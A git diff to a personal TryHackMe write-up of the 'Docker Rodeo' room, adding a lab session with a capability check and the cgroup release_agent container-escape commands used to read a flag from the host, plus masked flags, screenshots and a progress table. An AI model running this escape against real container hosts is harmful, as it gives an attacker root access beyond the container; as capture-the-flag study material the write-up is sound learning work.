@@ -1,9 +1,9 @@
 <h1 align="center">The Docker Rodeo</h1>
-<p align="center">2025, August 14<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>465</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<p align="center">2025, September 17<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>499</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
 <em>Learn a wide variety of Docker vulnerabilities in this guided showcase.</em><br>
 <img width="80px" src="https://github.com/user-attachments/assets/e91b1b0f-626f-4433-b412-9ba0058f9e33"><br>
 Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/dockerrodeo">here </a>.<br>
-<img width="1200px" src=""></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/9ebc05f0-d49a-405d-a5b7-c9facf822ece"></p>
 
 <br>
 
@@ -325,7 +325,7 @@ root@cb1207065aac:~/.ssh#
 <br>
 
 <h2>Task 11 . Vulnerability #7: Misconfigured Privileges (Deploy #2)</h2>
-<p>[ Start Machine</p>
+<p>[ Start Machine]</p>
 <h3>Understanding Capabilities</h3>
 <p>At it's fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.<br>
 
@@ -406,7 +406,45 @@ The code snippet below is based upon (but a modified) version of the Proof of Co
 <p><em>Answer the question below</em></p>
 
 <p>11.1. Contents of "flag.txt" from the host operating system<br>
-<code>________________________________</code></p>
+<code>thm{**********************}</code></p>
+
+
+```bash
+:~# ssh root@xx.xxx.xx.xxx -p 2244
+The authenticity of host '[xx.xx.xx.xxx]:2244 ([xx.xxx.xx.xxx]:2244)' can't be established.
+ECDSA key fingerprint is SHA256:...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[xx.xxx.xx.xxx]:2244' (ECDSA) to the list of known hosts.
+root@xx.xxx.xx.xxx's password: 
+root@8a9427527c82:~# 
+```
+
+```bash
+root@8a9427527c82:~# capsh --print | grep sys_admin
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+```
+
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"1(rvm)
+Guessed mode: UNCERTAIN (0)
+```
+
+```bash
+root@8a9427527c82:/# cat flag.txt
+thm{**********************}
+```
+
+<img width="1159" height="91" alt="image" src="https://github.com/user-attachments/assets/5ec61fd1-4068-4664-abfa-1ea052c852fa" />
+
 
 <br>
 <br>
@@ -465,6 +503,16 @@ Note in the screenshot below that there are very few processes running?</p>
 <p>13.1. Confirming suspicions...<br>
 <code>No answer needed</code></p>
 
+<img width="1162" height="170" alt="image" src="https://github.com/user-attachments/assets/940a086a-90b6-499d-b7c3-de1df5e74def" />
+
+<img width="1166" height="492" alt="image" src="https://github.com/user-attachments/assets/2b7371f6-acc3-47ca-be34-7e300adfd716" />
+
+<img width="1159" height="490" alt="image" src="https://github.com/user-attachments/assets/2771c1ca-f17e-4a76-be3d-b0c37a015f79" />
+
+
+<img width="1154" height="310" alt="image" src="https://github.com/user-attachments/assets/805b9b45-c74b-4af0-8c77-b2fe472514d7" />
+
+
 <br>
 <br>
 <h2>Task 14 . Additional Material</h2>
@@ -485,33 +533,61 @@ Note in the screenshot below that there are very few processes running?</p>
 
 <br>
 <br>
-<br>
 <h1 align="center">Completed</h1>
-<p align="center"><img width="1200px" src=""><br>
-                  <img width="1200px" src=""></p>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d06cb7b1-830e-4973-9c1e-311375e0b42e"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/14541d43-cfdb-4585-ac1f-6a7fe1df4649"></p>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/42c6a916-a5f2-44bc-8739-aea37cec7d3a"></p>
+
+<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>
+
+<div align="center"><h6>
+
+| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
+|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
+|17      |Medium 🔗 - <code><strong>The Docker Rodeo</strong></code>| 499| 106ᵗʰ| 4ᵗʰ   |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    967    |    74     |
+|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
+|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
+|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
+|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
+|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
+|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
+|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
+|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
+|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
+|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
+|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
+|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
+|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
+|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
+|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
+|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
+|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
+|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
+|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
+|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
+|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
+|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
+|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
+|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
+|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
+|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
+|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
+|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
+|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
+|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
+|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
+|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
+|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
+
+</h6></div><br>
 
 <br>
 
-<h1 align="center">My TryHackMe Journey</h1>
+<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/bd4d8f03-a594-4b87-a571-9ff3c819573c"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/35c95b07-ee0e-4c50-ae7d-7ef39f680d5d"><br><br>
+                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/25f8a5b4-ab6d-440c-88c3-e47abc2bb04d"><br>
+                  Global monthly:    346ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/da27bca8-e27c-433a-8c50-fd7252672e66"><br>
+                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a1ebca54-0026-42c1-839c-0aed15b1cd2a"><br>
 
-<div align="center">
-
-| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
-| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
-|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
-| 2025, August 14   |   465    |     120ᵗʰ    |      5ᵗʰ     |     302ⁿᵈ   |     9ᵗʰ    | 121,354  |    918    |    73     |
-
-
-</div>
-
-<p align="center">Global All Time:   120ᵗʰ<br><img width="250px" src=""><br>
-                                              <img width="1200px" src=""><br><br>
-                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src=""><br>
-                  Global monthly:    302ⁿᵈ<br><img width="1200px" src=""><br>
-                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src=""><br>
-
-<br>
-<h1 align="center">Thanks for Coming!</h1>
-<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
-
-
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
